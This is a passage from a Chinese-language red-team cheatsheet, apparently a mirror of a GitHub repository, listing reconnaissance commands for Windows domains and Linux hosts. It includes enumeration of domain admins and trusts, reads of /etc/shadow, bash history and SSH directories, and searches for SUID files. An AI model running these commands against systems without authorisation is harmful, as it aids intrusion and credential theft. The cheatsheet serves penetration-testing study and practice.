<h4 id="查看域信息-nltest-x2F-net"><a href="#查看域信息-nltest-x2F-net" class="headerlink" title="查看域信息 nltest&#x2F;net"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E4%BF%A1%E6%81%AF-nltestnet"></a>查看域信息 nltest&#x2F;net</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 查看域控<br>nltest /dsgetdc:域名<br>nltest /dclist:domain-a<br><br># 查看域之间的信任关系<br>nltest /domain_trusts<br><br># 查看域用户<br>net user /domain<br><br># 查看域用户组<br>net group /domain<br><br># 查看域管理组成员<br>net group &quot;domain admins&quot; /domain<br><br># 查看管理员登陆时间、密码过期时间，是否有登陆脚本、组分配等信息<br>net user domain-admin /domain<br><br># 查看域时间及域服务器名字，/domain只能是在域机器上执行 workgroup工作组不能执行<br>net time /domain<br>-------------------<br>此命令有三种情况:<br>1). 存在域,当前不是域用户<br>显示: 发生系统错误5. 拒绝访问<br><br>2). 存在域,当前用户是域用户<br>显示: 域,和当前被害人机器上的时间<br><br>3). 不存在域<br>显示: 找不到域 workgroup的域控制器,请键入net help....<br></code></pre></td></tr></table></figure>

<h3 id="Linux信息收集"><a href="#Linux信息收集" class="headerlink" title="Linux信息收集"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"></a>Linux信息收集</h3><h4 id="操作系统基本信息"><a href="#操作系统基本信息" class="headerlink" title="操作系统基本信息"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"></a>操作系统基本信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uname -a            # 打印所有可用信息<br>uname -r            # 内核版本信息<br>uname -n            # 系统主机名字<br>uname -m            # Linux内核架构<br>hostname            # 主机名<br>cat /proc/version    # 内核信息<br>cat /etc/*-release    # 发布信息<br>cat /etc/issue        # 发布信息<br>cat /proc/cpuinfo    # cpu信息<br>df -a                # 文件信息<br></code></pre></td></tr></table></figure>

<h4 id="系统环境信息"><a href="#系统环境信息" class="headerlink" title="系统环境信息"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF"></a>系统环境信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">env                    # 输出系统环境信息<br>set                    # 打印系统环境信息<br>echo $PATH            # 输出环境变量中的路径信息<br>history                # 打印历史命令<br>pwd                    # 当前路径<br>cat /etc/profile    # 显示默认系统环境变量<br>cat /etc/shells     # 显示可用的shell<br></code></pre></td></tr></table></figure>

<h4 id="系统服务信息"><a href="#系统服务信息" class="headerlink" title="系统服务信息"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF"></a>系统服务信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ps -aux                # 查看进程信息<br>top                    # 当前进程<br>netstat -anptu        # 查看当前交互端口<br></code></pre></td></tr></table></figure>

<h4 id="系统软件信息"><a href="#系统软件信息" class="headerlink" title="系统软件信息"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E7%B3%BB%E7%BB%9F%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF"></a>系统软件信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dpkg -l                # 查看已经安装的软件列表（debian/ubuntu）<br>rpm -qa                # 查看已经安装的软件列表（redhat/centos）<br></code></pre></td></tr></table></figure>

<p>通常程序都是通过-v或-V参数来获取版本信息，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sudo -V<br></code></pre></td></tr></table></figure>

<p>程序的一些配置文件路径，通常为<code>.conf</code>、<code>.ini</code>或其他后缀结尾：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/etc/apache2/apache2.conf            # apache默认配置文件    <br>/usr/local/nginx/conf/nginx.conf    # nginx默认配置文件<br>/usr/local/app/php5/lib/php.ini        # php默认配置文件<br>/etc/my.cnf                            # mysql配置文件<br>/var/log/                            # log目录下记录各种软件执行的日志<br></code></pre></td></tr></table></figure>

<h4 id="系统任务和作业"><a href="#系统任务和作业" class="headerlink" title="系统任务和作业"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E7%B3%BB%E7%BB%9F%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BD%9C%E4%B8%9A"></a>系统任务和作业</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">crontab                # 计划任务管理<br>/etc/crontab        # 计划任务配置文件（可能记录了用户自行添加的任务）<br>jobs -l                # 列出后台作业<br>ls /etc/cron*        # 列出计划任务<br></code></pre></td></tr></table></figure>

<p><code>crontab -l -u用户名</code>，不加<code>-u</code>默认列出当前用户的计划任务，加<code>-u</code>列出指定用户的计划任务（需要root权限）</p>
<h4 id="用户信息和组信息"><a href="#用户信息和组信息" class="headerlink" title="用户信息和组信息"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E5%92%8C%E7%BB%84%E4%BF%A1%E6%81%AF"></a>用户信息和组信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cat /etc/passwd        # 查看系统所有用户<br>grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#x27;$3==0&#123;print $1&#125;&#x27;    # 查看超级用户<br>cat /etc/group        # 查看系统所有组<br>cat /etc/shadow        # 查看系统所有用户的hash（需要root权限）<br>users                # 查看当前登陆的用户<br>who -a                # 查看当前登陆的用户<br>w                    # 查看当前登陆的用户有那些人，以及它们执行的程序<br>last                # 显示登陆用户的信息<br>lastlog                # 显示系统中所有用户最近一次登陆的信息<br>lastlog -u %username%        # 有关指定用户上次登录的信息<br>lastlog | grep -v &quot;Never&quot;    # 以前登录用户的信息<br></code></pre></td></tr></table></figure>

<h4 id="用户和权限信息"><a href="#用户和权限信息" class="headerlink" title="用户和权限信息"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E7%94%A8%E6%88%B7%E5%92%8C%E6%9D%83%E9%99%90%E4%BF%A1%E6%81%AF"></a>用户和权限信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">whoami                # 查看当前用户<br>id                    # 列出当前用户详细信息<br>cat /etc/sudoers    # 查看可以提升到root权限的用户<br>sudo -l                # 列出当前用户可执行和不可执行的命令<br></code></pre></td></tr></table></figure>

<h4 id="系统网络和路由信息"><a href="#系统网络和路由信息" class="headerlink" title="系统网络和路由信息"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E5%92%8C%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF"></a>系统网络和路由信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ifconfig -a                        # 列出网络接口信息<br>cat /etc/network/interfaces        # 列出网络接口信息<br>arp -a                            # 列出系统arp表<br>route                            # 打印路由信息<br>cat /etc/resolv.conf            # 查看dns配置信息<br>netstat -an                        # 打印本地开放信息<br>iptables -L                        # 列出iptables配置规则<br>cat /etc/services                # 查看端口服务应黑<br>cat /etc/hosts                    # hosts文件信息<br></code></pre></td></tr></table></figure>

<h4 id="获取其他信息"><a href="#获取其他信息" class="headerlink" title="获取其他信息"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E8%8E%B7%E5%8F%96%E5%85%B6%E4%BB%96%E4%BF%A1%E6%81%AF"></a>获取其他信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 查找拥有SUID的文件<br>find / -perm -4000 -type f<br><br># 查找root权限的SUID文件<br>find / -uid 0 -perm -40^0 -type f<br><br># 查找可写目录<br>find / -perm -2 -type d<br><br># 查看当前用户的历史记录<br>cat ~/.bash_history<br><br># 查看用户ssh登陆信息<br>ls ~/.ssh/<br><br># 查找备份压缩包文件<br>find / -name *.tar.gz或find / -name *.zip<br><br># 查找filename.ext文件<br>find / -name filename.ext<br><br># 全盘查找含有 flag 的文件<br>grep flag -r /<br></code></pre></td></tr></table></figure>

<h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"></a>域内信息收集</h3><h4 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%9F%9F"></a>判断是否存在域</h4><h5 id="ipconfig"><a href="#ipconfig" class="headerlink" title="ipconfig"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#ipconfig"></a>ipconfig</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 查看网关IP地址、DNS IP地址、域名、本机是否和DNS服务器处于同一网段<br>ipconfig /all<br><br># 解析域名IP地址，查看是否与DNS服务器为同一IP<br>nslookup test.com<br></code></pre></td></tr></table></figure>

<h5 id="查看系统详细信息-systeminfo"><a href="#查看系统详细信息-systeminfo" class="headerlink" title="查看系统详细信息 systeminfo"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF-systeminfo"></a>查看系统详细信息 systeminfo</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">systeminfo | findstr 域<br></code></pre></td></tr></table></figure>

<h5 id="查看当前登录域与域用户-netconfig"><a href="#查看当前登录域与域用户-netconfig" class="headerlink" title="查看当前登录域与域用户 netconfig"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%99%BB%E5%BD%95%E5%9F%9F%E4%B8%8E%E5%9F%9F%E7%94%A8%E6%88%B7-netconfig"></a>查看当前登录域与域用户 netconfig</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">net config workstation | findstr 域<br></code></pre></td></tr></table></figure>

<h5 id="判断主域-net-time"><a href="#判断主域-net-time" class="headerlink" title="判断主域 net time"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%88%A4%E6%96%AD%E4%B8%BB%E5%9F%9F-net-time"></a>判断主域 net time</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">net time /domain<br></code></pre></td></tr></table></figure>

<h4 id="收集域内基础信息"><a href="#收集域内基础信息" class="headerlink" title="收集域内基础信息"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%94%B6%E9%9B%86%E5%9F%9F%E5%86%85%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF"></a>收集域内基础信息</h4><h5 id="查看域-net-view"><a href="#查看域-net-view" class="headerlink" title="查看域 net view"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F-net-view"></a>查看域 net view</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">net view /domain<br></code></pre></td></tr></table></figure>

<h5 id="查看域内计算机-net-view"><a href="#查看域内计算机-net-view" class="headerlink" title="查看域内计算机 net view"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%86%85%E8%AE%A1%E7%AE%97%E6%9C%BA-net-view"></a>查看域内计算机 net view</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">net view /domian:domain_name<br></code></pre></td></tr></table></figure>

<h5 id="查看域内用户组列表-net-group"><a href="#查看域内用户组列表-net-group" class="headerlink" title="查看域内用户组列表 net group"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E7%BB%84%E5%88%97%E8%A1%A8-net-group"></a>查看域内用户组列表 net group</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">net group /domain<br></code></pre></td></tr></table></figure>

<h5 id="查看域管理员列表-net-group"><a href="#查看域管理员列表-net-group" class="headerlink" title="查看域管理员列表 net group"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%88%97%E8%A1%A8-net-group"></a>查看域管理员列表 net group</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">net group &quot;domain admins&quot; /domain<br></code></pre></td></tr></table></figure>

<h5 id="查看企业管理员列表-net-group"><a href="#查看企业管理员列表-net-group" class="headerlink" title="查看企业管理员列表 net group"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E4%BC%81%E4%B8%9A%E7%AE%A1%E7%90%86%E5%91%98%E5%88%97%E8%A1%A8-net-group"></a>查看企业管理员列表 net group</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">net group &quot;enterprise admins&quot; /domain<br></code></pre></td></tr></table></figure>

<h4 id="查看域内置administrator组用户"><a href="#查看域内置administrator组用户" class="headerlink" title="查看域内置administrator组用户"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%86%85%E7%BD%AEadministrator%E7%BB%84%E7%94%A8%E6%88%B7"></a>查看域内置administrator组用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">net localgroup administrators /domain<br></code></pre></td></tr></table></figure>

<h5 id="查看域密码策略信息-net-accounts"><a href="#查看域密码策略信息-net-accounts" class="headerlink" title="查看域密码策略信息 net accounts"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E4%BF%A1%E6%81%AF-net-accounts"></a>查看域密码策略信息 net accounts</h5><p>密码长短、错误锁定等信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">net accounts /domain<br></code></pre></td></tr></table></figure>

<h5 id="查看域信任信息-nltest"><a href="#查看域信任信息-nltest" class="headerlink" title="查看域信任信息 nltest"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E4%BF%A1%E4%BB%BB%E4%BF%A1%E6%81%AF-nltest"></a>查看域信任信息 nltest</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nltest /domain_trusts<br></code></pre></td></tr></table></figure>

<h4 id="收集域用户和管理员信息"><a href="#收集域用户和管理员信息" class="headerlink" title="收集域用户和管理员信息"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%94%B6%E9%9B%86%E5%9F%9F%E7%94%A8%E6%88%B7%E5%92%8C%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF"></a>收集域用户和管理员信息</h4><h5 id="查询域用户列表-net-user"><a href="#查询域用户列表-net-user" class="headerlink" title="查询域用户列表 net user"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8-net-user"></a>查询域用户列表 net user</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">net user /domain<br></code></pre></td></tr></table></figure>

<h5 id="查询域用户详细信息-wmic-useraccount"><a href="#查询域用户详细信息-wmic-useraccount" class="headerlink" title="查询域用户详细信息 wmic useraccount"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E7%94%A8%E6%88%B7%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF-wmic-useraccount"></a>查询域用户详细信息 wmic useraccount</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">wmic useraccount get /all<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">net user someuser /domain<br></code></pre></td></tr></table></figure>

<h5 id="查询存在的用户"><a href="#查询存在的用户" class="headerlink" title="查询存在的用户"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E8%AF%A2%E5%AD%98%E5%9C%A8%E7%9A%84%E7%94%A8%E6%88%B7"></a>查询存在的用户</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dsquery user<br></code></pre></td></tr></table></figure>

<h4 id="收集域控制器信息"><a href="#收集域控制器信息" class="headerlink" title="收集域控制器信息"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%94%B6%E9%9B%86%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E4%BF%A1%E6%81%AF"></a>收集域控制器信息</h4><h5 id="查看域控主机名"><a href="#查看域控主机名" class="headerlink" title="查看域控主机名"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%8E%A7%E4%B8%BB%E6%9C%BA%E5%90%8D"></a>查看域控主机名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nltest /DCLIST:npc<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nslookup -type=SRV _ladp._tcp<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netdom query pdc<br></code></pre></td></tr></table></figure>

